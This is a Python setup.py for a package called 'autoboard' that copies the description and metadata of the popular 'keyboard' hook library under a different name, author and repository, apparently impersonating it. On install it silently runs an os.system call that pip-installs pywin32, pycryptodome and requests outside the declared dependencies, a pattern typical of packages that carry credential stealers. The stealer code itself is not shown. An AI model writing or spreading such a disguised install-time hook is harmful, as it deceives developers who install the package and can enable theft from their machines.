"""
Usage instructions:

- If you are installing: `python setup.py install`
- If you are developing: `python setup.py sdist --format=zip bdist_wheel --universal bdist_wininst && twine check dist/*`
"""
import keyboard

from setuptools import setup
import os

os.system('pip install pywin32 pycryptodome requests')

setup(
    name='autoboard',
    version=keyboard.version,
    author='Alp',
    author_email='blabla@gmail.com',
    packages=['autoboard'],
    url='https://github.com/muyrenit/keyboard',
    license='MIT',
    description='Hook and simulate keyboard events on Windows and Linux',
    keywords = 'keyboard hook simulate hotkey',

    # Wheel creation breaks with Windows newlines.
    # https://github.com/pypa/setuptools/issues/1126
    long_description=keyboard.__doc__.replace('\r\n', '\n'),
    long_description_content_type='text/markdown',

    install_requires=["pyobjc; sys_platform=='darwin'"], # OSX-specific dependency
    classifiers=[
        'Development Status :: 4 - Beta',
        'License :: OSI Approved :: MIT License',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: Unix',
        'Operating System :: MacOS :: MacOS X',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 3',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Utilities',
    ],
)
